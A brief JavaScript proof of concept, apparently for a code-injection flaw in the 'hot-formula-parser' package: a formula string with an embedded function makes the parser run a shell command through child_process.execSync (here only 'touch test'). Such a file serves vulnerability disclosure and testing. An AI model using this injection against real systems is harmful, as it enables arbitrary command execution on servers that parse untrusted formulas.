var FormulaParser = require('hot-formula-parser').Parser;
var parser = new FormulaParser();
 
// parser.parse();
parser.parse("SUM([(function(){require('child_process').execSync('touch test')})(),2])"); 
// parser.parse("SUM([(function(){ppppppppppppppooooooooooooooocccccccccccccccc})(),2])"); 
